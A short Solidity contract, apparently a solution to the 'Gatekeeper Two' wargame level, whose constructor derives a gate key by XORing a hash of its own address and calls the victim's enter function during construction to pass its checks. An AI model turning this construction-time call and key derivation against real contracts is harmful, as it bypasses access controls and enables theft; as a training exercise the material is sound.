// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {
    constructor(address _victim) {
        bytes8 gatekey;
        gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _victim.call(abi.encodeWithSignature("enter(bytes8)", gatekey));
    }
    
}